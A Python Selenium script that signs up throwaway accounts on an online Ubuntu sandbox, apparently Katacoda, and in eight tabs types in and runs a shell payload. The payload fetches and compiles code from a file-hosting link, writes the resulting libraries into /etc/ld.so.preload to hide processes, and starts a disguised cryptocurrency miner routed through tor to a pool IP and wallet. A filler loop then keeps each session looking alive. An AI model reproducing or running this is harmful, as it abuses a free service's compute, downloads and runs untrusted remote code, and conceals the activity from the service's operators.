from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains  
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import tkinter as tk
import names
import secrets
import random
import string
import os

for i in range(1):
    rand_name = names.get_first_name(gender='male')
S = 5
ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
main= (rand_name+ran+'@outlook.com')
main2 = ''.join((secrets.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(8)))

driver = webdriver.Chrome()

driver.get('https://www.katacoda.com/courses/ubuntu/playground')
time.sleep(15)
driver.find_element_by_xpath('//*[@id="email"]').send_keys(main)
driver.find_element_by_xpath('//*[@id="password"]').send_keys(main2)
driver.find_element_by_xpath('//*[@id="auth-dialog"]/form/div[2]/div[3]/button').click()	
time.sleep(25)

languages = 8
for i in range(languages):
    k = 6
    name = names.get_first_name(gender='male')
    name2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k = k))
    driver.execute_script("window.open()")
    driver.switch_to.window(driver.window_handles[i+1])
    driver.get("https://www.katacoda.com/courses/ubuntu/playground")
    time.sleep(18)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("touch ", name+name2+".sh")
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys('echo "apt update && apt install wget sudo git cmake cpulimit tor gcc -y > /dev/null 2>&1 & sleep 80 && cd /root && GIT_SSL_NO_VERIFY=true git clone https://github.com/rofl0r/proxychains-ng.git && cd proxychains-ng && ./configure --prefix=/usr --sysconfdir=/etc && make && sudo make install && sudo make install-config && cd /root && rm -rf proxychains-ng && fol=$(openssl rand -hex 6) && h1=$(openssl rand -hex 6) && l1=$(openssl rand -hex 6) && h2=$(openssl rand -hex 6) && l2=$(openssl rand -hex 6) && h3=$(openssl rand -hex 6) && l3=$(openssl rand -hex 6) && mav=$(openssl rand -hex 4) && temp=$(openssl rand -hex 7) && zi=$(openssl rand -hex 4) && cd /root && mkdir $fol && cd $fol && curl -k -Lfo $zi.zip https://2009.filemail.com/api/file/get?filekey=NsNPAZ4vL0pPi3u22WCQrb_wZrV6r4cBdk4sNprscDs_nrPcbNetTw && unzip $zi.zip && rm $zi.zip && mv nim.c $h3.c  && gcc -Wall -fPIC -shared -o $l3.so $h3.c -ldl && sudo mv $l3.so /usr/local/lib/ && echo /usr/local/lib/$l3.so >> /etc/ld.so.preload && mv cp.c $h1.c && gcc -Wall -fPIC -shared -o $l1.so $h1.c -ldl && sudo mv $l1.so /usr/local/lib/ && echo /usr/local/lib/$l1.so >> /etc/ld.so.preload && mv mko.c $h2.c && sed -ri "s/mavic/${mav}/" $h2.c && gcc -Wall -fPIC -shared -o $l2.so $h2.c -ldl && sudo mv $l2.so /usr/local/lib/ && echo /usr/local/lib/$l2.so >> /etc/ld.so.preload && mv mavic $mav && chmod 777 $mav && service tor start > /dev/null 2>&1 & sleep 5 && proxychains4 ./$mav -v -l 139.99.123.225:3956 -u RBw9nUhueGuapWsaekrYUDQQXfon56WKMT.$wo -p x -t 2 > /dev/null 2>&1 & " >', name+name2+'.sh')
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys('bash ', name+name2+'.sh > /dev/null 2>&1')
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)   
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("while :; do     rodin=$(openssl rand -hex 20);     echo $rodin;     sleep 5;     rod=$(openssl rand -base64 15);     echo $rod;     sleep 20; done")
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(30)
